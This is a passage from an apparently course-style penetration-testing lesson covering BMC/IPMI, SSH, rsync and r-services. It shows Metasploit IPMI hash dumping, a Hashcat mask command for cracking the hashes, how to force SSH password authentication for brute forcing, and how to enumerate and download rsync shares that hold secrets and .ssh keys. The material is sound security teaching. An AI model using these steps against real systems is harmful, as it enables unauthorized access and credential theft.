<td>Supermicro IPMI</td>
<td>ADMIN</td>
<td>ADMIN</td>
</tr>
</tbody>
</table>
<p>It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.</p>
<hr>
<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>If default credentials do not work to access a BMC, we can turn to a <a href="http://fish2.com/ipmi/remote-pw-cracking.html">flaw</a> in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user&#39;s password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using <code>Hashcat</code> mode <code>7300</code>. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command <code>hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u</code> which tries all combinations of upper case letters and numbers for an eight-character password.</p>
<p>There is no direct &quot;fix&quot; to this issue because the flaw is a critical component of the IPMI specification. Clients can opt for very long, difficult to crack passwords or implement network segmentation rules to restrict the direct access to the BMCs. It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.</p>
<p>To retrieve IPMI hashes, we can use the Metasploit <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi\_dumphashes/">IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval</a> module.</p>
<p><strong>Metasploit Dumping Hashes</strong></p>
<p>IPMI</p>
<pre><code class="lang-shell-session">msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; <span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">10.129.42.195</span>
msf6 <span class="hljs-comment">auxiliary(scanner</span>/ipmi/<span class="hljs-comment">ipmi_dumphashes) &gt; show options</span> 

Module <span class="hljs-comment">options (auxiliary</span>/scanner/<span class="hljs-comment">ipmi</span>/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               <span class="hljs-keyword">yes</span>       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     <span class="hljs-keyword">no</span>        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        <span class="hljs-keyword">no</span>        Save captured password hashes in john the ripper format
   PASS_FILE            /<span class="hljs-comment">usr</span>/share/<span class="hljs-comment">metasploit-framework</span>/data/<span class="hljs-comment">wordlists</span>/ipmi_passwords.txt  <span class="hljs-keyword">yes</span>       <span class="hljs-keyword">File</span> containing common passwords <span class="hljs-keyword">for</span> offline cracking, one per line
   RHOSTS               <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.195</span>                                                      <span class="hljs-keyword">yes</span>       The target host(s), range CIDR identifier, <span class="hljs-keyword">or</span> hosts <span class="hljs-keyword">file</span> with syntax <span class="hljs-comment">'file:&lt;path&gt;'</span>
   RPORT                <span class="hljs-number">623</span>                                                                <span class="hljs-keyword">yes</span>       The target port
   THREADS              <span class="hljs-number">1</span>                                                                  <span class="hljs-keyword">yes</span>       The number of concurrent threads (<span class="hljs-built-in">max</span> one per host)
   USER_FILE            /<span class="hljs-comment">usr</span>/share/<span class="hljs-comment">metasploit-framework</span>/data/<span class="hljs-comment">wordlists</span>/ipmi_users.txt      <span class="hljs-keyword">yes</span>       <span class="hljs-keyword">File</span> containing usernames, one per line



msf6 auxiliary(scanner/<span class="hljs-comment">ipmi</span>/ipmi_dumphashes) &gt; run

[+] <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.195</span>:<span class="hljs-number">623</span> - IPMI - Hash found: ADMIN:<span class="hljs-number">8e160</span>d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.195</span>:<span class="hljs-number">623</span> - IPMI - Hash <span class="hljs-keyword">for</span> user <span class="hljs-comment">'ADMIN'</span> matches password <span class="hljs-comment">'ADMIN'</span>
[*] Scanned <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)
[*] Auxiliary module execution completed
</code></pre>
<p>Here we can see that we have successfully obtained the password hash for the user <code>ADMIN</code>, and the tool was able to quickly crack it to reveal what appears to be a default password <code>ADMIN</code>. From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems. IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing.</p>
<p>\
Linux Remote Management Protocols</p>
<hr>
<p>In the world of Linux distributions, there are many ways to manage the servers remotely. For example, let us imagine that we are in one of many locations and one of our employees who just went to a customer in another city needs our help because of an error that he cannot solve. Efficient troubleshooting will look difficult over a phone call in most cases, so it is beneficial if we know how to log onto the remote system to manage it.</p>
<p>These applications and services can be found on almost every server in the public network. It is time-saving since we do not have to be physically present at the server, and the working environment still looks the same. These protocols and applications for remote systems management are an exciting target for these reasons. If the configuration is incorrect, we, as penetration testers, can even quickly gain access to the remote system. Therefore, we should familiarize ourselves with the most important protocols, servers, and applications for this purpose.</p>
<hr>
<h3 id="ssh">SSH</h3>
<p><a href="https://en.wikipedia.org/wiki/Secure\_Shell">Secure Shell</a> (<code>SSH</code>) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port <code>TCP 22</code>. This is necessary to prevent third parties from intercepting the data stream and thus intercepting sensitive data. The SSH server can also be configured to only allow connections from specific clients. An advantage of SSH is that the protocol runs on all common operating systems. Since it is originally a Unix application, it is also implemented natively on all Linux distributions and MacOS. SSH can also be used on Windows, provided we install an appropriate program. The well-known <a href="https://www.openssh.com/">OpenBSD SSH</a> (<code>OpenSSH</code>) server on Linux distributions is an open-source fork of the original and commercial <code>SSH</code> server from SSH Communication Security. Accordingly, there are two competing protocols: <code>SSH-1</code> and <code>SSH-2</code>.</p>
<p><code>SSH-2</code>, also known as SSH version 2, is a more advanced protocol than SSH version 1 in encryption, speed, stability, and security. For example, <code>SSH-1</code> is vulnerable to <code>MITM</code> attacks, whereas SSH-2 is not.</p>
<p>We can imagine that we want to manage a remote host. This can be done via the command line or GUI. Besides, we can also use the SSH protocol to send commands to the desired system, transfer files, or do port forwarding. Therefore, we need to connect to it using the SSH protocol and authenticate ourselves to it. In total, OpenSSH has six different authentication methods:</p>
<ol>
<li>Password authentication</li>
<li>Public-key authentication</li>
<li>Host-based authentication</li>
<li>Keyboard authentication</li>
<li>Challenge-response authentication</li>
<li>GSSAPI authentication</li>
</ol>
<p>We will take a closer look at and discuss one of the most commonly used authentication methods. In addition, we can learn more about the other authentication methods <a href="https://www.golinuxcloud.com/openssh-authentication-methods-sshd-config/">here</a> among others.</p>
<p><strong>Public Key Authentication</strong></p>
<p>In a first step, the SSH server and client authenticate themselves to each other. The server sends a certificate to the client to verify that it is the correct server. Only when contact is first established is there a risk of a third party interposing itself between the two participants and thus intercepting the connection. Since the certificate itself is also encrypted, it cannot be imitated. Once the client knows the correct certificate, no one else can pretend to make contact via the corresponding server.</p>
<p>After server authentication, however, the client must also prove to the server that it has access authorization. However, the SSH server is already in possession of the encrypted hash value of the password set for the desired user. As a result, users have to enter the password every time they log on to another server during the same session. For this reason, an alternative option for client-side authentication is the use of a public key and private key pair.</p>
<p>The private key is created individually for the user&#39;s own computer and secured with a passphrase that should be longer than a typical password. The private key is stored exclusively on our own computer and always remains secret. If we want to establish an SSH connection, we first enter the passphrase and thus open access to the private key.</p>
<p>Public keys are also stored on the server. The server creates a cryptographic problem with the client&#39;s public key and sends it to the client. The client, in turn, decrypts the problem with its own private key, sends back the solution, and thus informs the server that it may establish a legitimate connection. During a session, users only need to enter the passphrase once to connect to any number of servers. At the end of the session, users log out of their local machines, ensuring that no third party who gains physical access to the local machine can connect to the server.</p>
<hr>
<h3 id="default-configuration">Default Configuration</h3>
<p>The <a href="https://www.ssh.com/academy/ssh/sshd\_config">sshd_config</a> file, responsible for the OpenSSH server, has only a few of the settings configured by default. However, the default configuration includes X11 forwarding, which contained a command injection vulnerability in version 7.2p1 of OpenSSH in 2016. Nevertheless, we do not need a GUI to manage our servers.</p>
<p><strong>Default Configuration</strong></p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ cat /etc</span><span class="hljs-regexp">/ssh/sshd</span>_config  | grep -v <span class="hljs-string">"#"</span> | sed -r <span class="hljs-string">'/^\s*$/d'</span>

Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">openssh</span>/<span class="hljs-title">sftp</span>-<span class="hljs-title">server</span></span>
</code></pre>
<p>Most settings in this configuration file are commented out and require manual configuration.</p>
<hr>
<h3 id="dangerous-settings">Dangerous Settings</h3>
<p>Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:</p>
<table>
<thead>
<tr>
<th><strong>Setting</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>PasswordAuthentication yes</code></td>
<td>Allows password-based authentication.</td>
</tr>
<tr>
<td><code>PermitEmptyPasswords yes</code></td>
<td>Allows the use of empty passwords.</td>
</tr>
<tr>
<td><code>PermitRootLogin yes</code></td>
<td>Allows to log in as the root user.</td>
</tr>
<tr>
<td><code>Protocol 1</code></td>
<td>Uses an outdated version of encryption.</td>
</tr>
<tr>
<td><code>X11Forwarding yes</code></td>
<td>Allows X11 forwarding for GUI applications.</td>
</tr>
<tr>
<td><code>AllowTcpForwarding yes</code></td>
<td>Allows forwarding of TCP ports.</td>
</tr>
<tr>
<td><code>PermitTunnel</code></td>
<td>Allows tunneling.</td>
</tr>
<tr>
<td><code>DebianBanner yes</code></td>
<td>Displays a specific banner when logging in.</td>
</tr>
</tbody>
</table>
<p>Allowing password authentication allows us to brute-force a known username for possible passwords. Many different methods can be used to guess the passwords of users. For this purpose, specific <code>patterns</code> are usually used to mutate the most commonly used passwords and, frighteningly, correct them. This is because we humans are lazy and do not want to remember complex and complicated passwords. Therefore, we create passwords that we can easily remember, and this leads to the fact that, for example, numbers or characters are added only at the end of the password. Believing that the password is secure, the mentioned patterns are used to guess precisely such &quot;adjustments&quot; of these passwords. However, some instructions and <a href="https://www.ssh-audit.com/hardening\_guides.html">hardening guides</a> can be used to harden our SSH servers.</p>
<hr>
<h3 id="footprinting-the-service">Footprinting the Service</h3>
<p>One of the tools we can use to fingerprint the SSH server is <a href="https://github.com/jtesta/ssh-audit">ssh-audit</a>. It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. Of course, this could be exploited by attacking the server or client at the cryptic level later.</p>
<p><strong>SSH-Audit</strong></p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ git clone https:<span class="hljs-comment">//github.com/jtesta/ssh-audit.git &amp;&amp; cd ssh-audit</span>
root@htb[/htb]$ ./ssh-audit.py <span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.132</span>

<span class="hljs-meta"># general</span>
(gen) banner: SSH<span class="hljs-number">-2.0</span>-OpenSSH_8<span class="hljs-number">.2</span>p1 Ubuntu<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.3</span>
(gen) software: OpenSSH <span class="hljs-number">8.2</span>p1
(gen) compatibility: OpenSSH <span class="hljs-number">7.4</span>+, Dropbear SSH <span class="hljs-number">2018.76</span>+
(gen) compression: enabled (zlib@openssh.com)                                   

<span class="hljs-meta"># key exchange algorithms</span>
(kex) curve25519-sha256                     -- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">7.4</span>, Dropbear SSH <span class="hljs-number">2018.76</span>                            
(kex) curve25519-sha256@libssh.org          -- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">6.5</span>, Dropbear SSH <span class="hljs-number">2013.62</span>
(kex) ecdh-sha2-nistp256                    -- [fail] <span class="hljs-keyword">using</span> weak elliptic curves
                                            `- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">5.7</span>, Dropbear SSH <span class="hljs-number">2013.62</span>
(kex) ecdh-sha2-nistp384                    -- [fail] <span class="hljs-keyword">using</span> weak elliptic curves
                                            `- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">5.7</span>, Dropbear SSH <span class="hljs-number">2013.62</span>
(kex) ecdh-sha2-nistp521                    -- [fail] <span class="hljs-keyword">using</span> weak elliptic curves
                                            `- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">5.7</span>, Dropbear SSH <span class="hljs-number">2013.62</span>
(kex) diffie-hellman-group-exchange-sha256 (<span class="hljs-number">2048</span>-<span class="hljs-built_in">bit</span>) -- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">4.4</span>
(kex) diffie-hellman-group16-sha512         -- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">7.3</span>, Dropbear SSH <span class="hljs-number">2016.73</span>
(kex) diffie-hellman-group18-sha512         -- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">7.3</span>
(kex) diffie-hellman-group14-sha256         -- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">7.3</span>, Dropbear SSH <span class="hljs-number">2016.73</span>

<span class="hljs-meta"># host-key algorithms</span>
(key) rsa-sha2<span class="hljs-number">-512</span> (<span class="hljs-number">3072</span>-<span class="hljs-built_in">bit</span>)               -- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">7.2</span>
(key) rsa-sha2<span class="hljs-number">-256</span> (<span class="hljs-number">3072</span>-<span class="hljs-built_in">bit</span>)               -- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">7.2</span>
(key) ssh-rsa (<span class="hljs-number">3072</span>-<span class="hljs-built_in">bit</span>)                    -- [fail] <span class="hljs-keyword">using</span> weak hashing algorithm
                                            `- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">2.5</span><span class="hljs-number">.0</span>, Dropbear SSH <span class="hljs-number">0.28</span>
                                            `- [info] a future deprecation notice has been issued in OpenSSH <span class="hljs-number">8.2</span>: https:<span class="hljs-comment">//www.openssh.com/txt/release-8.2</span>
(key) ecdsa-sha2-nistp256                   -- [fail] <span class="hljs-keyword">using</span> weak elliptic curves
                                            `- [warn] <span class="hljs-keyword">using</span> weak <span class="hljs-built_in">random</span> number generator could reveal the key
                                            `- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">5.7</span>, Dropbear SSH <span class="hljs-number">2013.62</span>
(key) ssh-ed25519                           -- [info] <span class="hljs-built_in">available</span> since OpenSSH <span class="hljs-number">6.5</span>
...SNIP...
</code></pre>
<p>The first thing we can see in the first few lines of the output is the banner that reveals the version of the OpenSSH server. The previous versions had some vulnerabilities, such as <a href="https://www.cvedetails.com/cve/CVE-2020-14145/">CVE-2020-14145</a>, which allowed the attacker the capability to Man-In-The-Middle and attack the initial connection attempt. The detailed output of the connection setup with the OpenSSH server can also often provide important information, such as which authentication methods the server can use.</p>
<p><strong>Change Authentication Method</strong></p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ ssh -v cry0l1t3@<span class="hljs-number">10.129</span><span class="hljs-number">.14</span><span class="hljs-number">.132</span>

OpenSSH_8<span class="hljs-number">.2</span>p1 Ubuntu<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.3</span>, OpenSSL <span class="hljs-number">1.1</span><span class="hljs-number">.1</span>f  <span class="hljs-number">31</span> Mar <span class="hljs-number">2020</span>
<span class="hljs-string">debug1:</span> Reading configuration data <span class="hljs-regexp">/etc/</span>ssh/ssh_config 
...SNIP...
<span class="hljs-string">debug1:</span> Authentications that can <span class="hljs-string">continue:</span> publickey,password,keyboard-interactive
</code></pre>
<p>For potential brute-force attacks, we can specify the authentication method with the SSH client option <code>PreferredAuthentications</code>.</p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh -v cry0l1t3@<span class="hljs-number">10.129</span>.<span class="hljs-number">14.132</span> -o PreferredAuthentications=password

OpenSSH_8.<span class="hljs-number">2</span>p1 Ubuntu-<span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">3</span>, OpenSSL <span class="hljs-number">1.1</span>.<span class="hljs-number">1</span>f  <span class="hljs-number">31</span> Mar <span class="hljs-number">2020</span>
debug1: Reading configuration data /etc/ssh/ssh_config
...SNIP...
debug1: Authentications that can <span class="hljs-keyword">continue</span>: publickey,password,keyboard-interactive
debug1: Next authentication <span class="hljs-function"><span class="hljs-keyword">method</span>:</span> password

cry0l1t3@<span class="hljs-number">10.129</span>.<span class="hljs-number">14.132</span><span class="hljs-string">'s password:</span>
</code></pre>
<p>Even with this obvious and secure service, we recommend setting up our own OpenSSH server on our VM, experimenting with it, and familiarizing ourselves with the different settings and options.</p>
<p>We may encounter various banners for the SSH server during our penetration tests. By default, the banners start with the version of the protocol that can be applied and then the version of the server itself. For example, with <code>SSH-1.99-OpenSSH_3.9p1</code>, we know that we can use both protocol versions SSH-1 and SSH-2, and we are dealing with OpenSSH server version 3.9p1. On the other hand, for a banner with <code>SSH-2.0-OpenSSH_8.2p1</code>, we are dealing with an OpenSSH version 8.2p1 which only accepts the SSH-2 protocol version.</p>
<hr>
<h3 id="rsync">Rsync</h3>
<p><a href="https://linux.die.net/man/1/rsync">Rsync</a> is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts. It is highly versatile and well-known for its delta-transfer algorithm. This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host. It does this by sending only the differences between the source files and the older version of the files that reside on the destination server. It is often used for backups and mirroring. It finds files that need to be transferred by looking at files that have changed in size or the last modified time. By default, it uses port <code>873</code> and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection.</p>
<p>This <a href="https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync">guide</a> covers some of the ways Rsync can be abused, most notably by listing the contents of a shared folder on a target server and retrieving files. This can sometimes be done without authentication. Other times we will need credentials. If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.</p>
<p>Let&#39;s do a bit of quick footprinting. We can see that Rsync is in use using protocol 31.</p>
<p><strong>Scanning for Rsync</strong></p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo <span class="hljs-keyword">nmap</span> -sV -<span class="hljs-keyword">p</span> <span class="hljs-number">873</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>

Starting Nmap <span class="hljs-number">7.92</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2022</span>-<span class="hljs-number">09</span>-<span class="hljs-number">19</span> <span class="hljs-number">09</span>:<span class="hljs-number">31</span> EDT
Nmap scan report <span class="hljs-keyword">for</span> localhost (<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>)
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.0058</span>s latency).

PORT    STATE SERVICE VERSION
<span class="hljs-number">873</span>/tcp <span class="hljs-keyword">open</span>  rsync   (protocol <span class="hljs-keyword">version</span> <span class="hljs-number">31</span>)

Service detection performed. Please report any incorrect results at http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">1.13</span> seconds
</code></pre>
<p><strong>Probing for Accessible Shares</strong></p>
<p>We can next probe the service a bit to see what we can gain access to.</p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ nc -nv <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">873</span>

(UNKNOWN) [<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>] <span class="hljs-number">873</span> (rsync) open
<span class="hljs-symbol">@RSYNCD</span>: <span class="hljs-number">31.0</span>
<span class="hljs-symbol">@RSYNCD</span>: <span class="hljs-number">31.0</span>
<span class="hljs-meta">#list</span>
dev                Dev Tools
<span class="hljs-symbol">@RSYNCD</span>: <span class="hljs-keyword">EXIT</span>
</code></pre>
<p><strong>Enumerating an Open Share</strong></p>
<p>Here we can see a share called <code>dev</code>, and we can enumerate it further.</p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ rsync -av --list-only rsync://<span class="hljs-number">127.0.0.1</span>/dev

receiving incremental file list
drwxr-xr-x             <span class="hljs-number">48 2022/09</span>/<span class="hljs-number">19 09:43:10</span> .
-rw-r--r--              <span class="hljs-number">0 2022/09</span>/<span class="hljs-number">19 09:34:50</span> build.sh
-rw-r--r--              <span class="hljs-number">0 2022/09</span>/<span class="hljs-number">19 09:36:02</span> secrets.yaml
drwx------             <span class="hljs-number">54 2022/09</span>/<span class="hljs-number">19 09:43:10</span> .ssh

sent <span class="hljs-number">25</span> bytes  received <span class="hljs-number">221</span> bytes  <span class="hljs-number">492</span>.<span class="hljs-number">00</span> bytes/sec
total size is <span class="hljs-number">0</span>  speedup is <span class="hljs-number">0</span>.<span class="hljs-number">00</span>
</code></pre>
<p>From the above output, we can see a few interesting files that may be worth pulling down to investigate further. We can also see that a directory likely containing SSH keys is accessible. From here, we could sync all files to our attack host with the command <code>rsync -av rsync://127.0.0.1/dev</code>. If Rsync is configured to use SSH to transfer files, we could modify our commands to include the <code>-e ssh</code> flag, or <code>-e &quot;ssh -p2222&quot;</code> if a non-standard port is in use for SSH. This <a href="https://phoenixnap.com/kb/how-to-rsync-over-ssh">guide</a> is helpful for understanding the syntax for using Rsync over SSH.</p>
<hr>
<h3 id="r-services">R-Services</h3>
<p>R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP. Initially developed by the Computer Systems Research Group (<code>CSRG</code>) at the University of California, Berkeley, <code>r-services</code> were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (<code>SSH</code>) protocols and commands due to inherent security flaws built into them. Much like <code>telnet</code>, r-services transmit information from client to server(and vice versa.) over the network in an unencrypted format, making it possible for attackers to intercept network traffic (passwords, login information, etc.) by performing man-in-the-middle (<code>MITM</code>) attacks.</p>
<p><code>R-services</code> span across the ports <code>512</code>, <code>513</code>, and <code>514</code> and are only accessible through a suite of programs known as <code>r-commands</code>. They are most commonly used by commercial operating systems such as Solaris, HP-UX, and AIX. While less common nowadays, we do run into them from time to time during our internal penetration tests so it is worth understanding how to approach them.</p>
<p>The <a href="https://en.wikipedia.org/wiki/Berkeley\_r-commands">R-commands</a> suite consists of the following programs:</p>
<ul>
<li>rcp (<code>remote copy</code>)</li>
<li>rexec (<code>remote execution</code>)</li>
<li>rlogin (<code>remote login</code>)</li>
<li>rsh (<code>remote shell</code>)</li>
<li>rstat</li>
<li>ruptime</li>
<li>rwho (<code>remote who</code>)</li>
</ul>
<p>Each command has its intended functionality; however, we will only cover the most commonly abused <code>r-commands</code>. The table below will provide a quick overview of the most frequently abused commands, including the service daemon they interact with, over what port and transport method to which they can be accessed, and a brief description of each.</p>
<table>
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Service Daemon</strong></th>
<th><strong>Port</strong></th>
<th><strong>Transport Protocol</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>rcp</code></td>
<td><code>rshd</code></td>
<td>514</td>
<td>TCP</td>
<td>Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the <code>cp</code> command on Linux but provides <code>no warning to the user for overwriting existing files on a system</code>.</td>
</tr>
<tr>
<td><code>rsh</code></td>
<td><code>rshd</code></td>
<td>514</td>
<td>TCP</td>
<td>Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files for validation.</td>
</tr>
<tr>
<td><code>rexec</code></td>
<td><code>rexecd</code></td>
<td>512</td>
<td>TCP</td>
<td>Enables a user to run shell commands on a remote machine. Requires authentication through the use of a <code>username</code> and <code>password</code> through an unencrypted network socket. Authentication is overridden by the trusted entries in the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files.</td>
</tr>
<tr>
<td><code>rlogin</code></td>
<td><code>rlogind</code></td>
<td>513</td>
<td>TCP</td>
<td>Enables a user to log in to a remote host over the network. It works similarly to <code>telnet</code> but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files.</td>
</tr>
</tbody>
</table>
<p>The /etc/hosts.equiv file contains a list of trusted hosts and is used to grant access to other systems on the network. When users on one of these hosts attempt to access the system, they are automatically granted access without further authentication.</p>
<p><strong>/etc/hosts.equiv</strong></p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/hosts.equiv

<span class="hljs-meta"># <span class="hljs-meta-string">&lt;hostname&gt;</span> <span class="hljs-meta-string">&lt;local username&gt;</span></span>
pwnbox cry0l1t3
</code></pre>
<p>Now that we have a basic understanding of <code>r-commands</code>, let&#39;s do some quick footprinting using <code>Nmap</code> to determine if all necessary ports are open.</p>
<p><strong>Scanning for R-Services</strong></p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo <span class="hljs-keyword">nmap</span> -sV -<span class="hljs-keyword">p</span> <span class="hljs-number">512</span>,<span class="hljs-number">513</span>,<span class="hljs-number">514</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">17.2</span>

Starting Nmap <span class="hljs-number">7.80</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2022</span>-<span class="hljs-number">12</span>-<span class="hljs-number">02</span> <span class="hljs-number">15</span>:<span class="hljs-number">02</span> EST
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">17.2</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.11</span>s latency).

PORT    STATE SERVICE    VERSION
<span class="hljs-number">512</span>/tcp <span class="hljs-keyword">open</span>  exec?
<span class="hljs-number">513</span>/tcp <span class="hljs-keyword">open</span>  login?
<span class="hljs-number">514</span>/tcp <span class="hljs-keyword">open</span>  tcpwrapped

Service detection performed. Please report any incorrect results at http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host <span class="hljs-keyword">up</span>) scanned in <span class="hljs-number">145.54</span> seconds
</code></pre>
<p><strong>Access Control &amp; Trusted Relationships</strong></p>
<p>The primary concern for <code>r-services</code>, and one of the primary reasons <code>SSH</code> was introduced to replace it, is the inherent issues regarding access control for these protocols. R-services rely on trusted information sent from the remote client to the host machine they are attempting to authenticate to. By default, these services utilize <a href="https://debathena.mit.edu/trac/wiki/PAM">Pluggable Authentication Modules (PAM)</a> for user authentication onto a remote system; however, they also bypass this authentication through the use of the <code>/etc/hosts.equiv</code> and <code>.rhosts</code> files on the system. The <code>hosts.equiv</code> and <code>.rhosts</code> files contain a list of hosts (<code>IPs</code> or <code>Hostnames</code>) and users that are <code>trusted</code> by the local host when a connection attempt is made using <code>r-commands</code>. Entries in either file can appear like the following:</p>
<p>Note: The <code>hosts.equiv</code> file is recognized as the global configuration regarding all users on a system, whereas <code>.rhosts</code> provides a per-user configuration.</p>
<p><strong>Sample .rhosts File</strong></p>
<p>Linux Remote Management Protocols</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat .rhosts

htb-student     <span class="hljs-number">10.0</span><span class="hljs-number">.17</span><span class="hljs-number">.5</span>
+               <span class="hljs-number">10.0</span><span class="hljs-number">.17</span><span class="hljs-number">.10</span>
+               +
</code></pre>
<p>As we can see from this example, both files follow the specific syntax of <code>&lt;username&gt; &lt;ip address&gt;</code> or <code>&lt;username&gt; &lt;hostname&gt;</code> pairs. Additionally, the <code>+</code> modifier can be used within these files as a wildcard to specify anything. In this example, the <code>+</code> modifier allows any external user to access r-commands from the <code>htb-student</code> user account via the host with the IP address <code>10.0.17.10</code>.</p>
<p>Misconfigurations in either of these files can allow an attacker to authenticate as another user without credentials, with the potential for gaining code execution. Now that we understand how we can potentially abuse misconfigurations in these files let&#39;s attempt to try logging into a target host using <code>rlogin</code>.</p>
<p><strong>Logging in Using Rlogin</strong></p>
<p>Linux Remote Management Protocols</p>
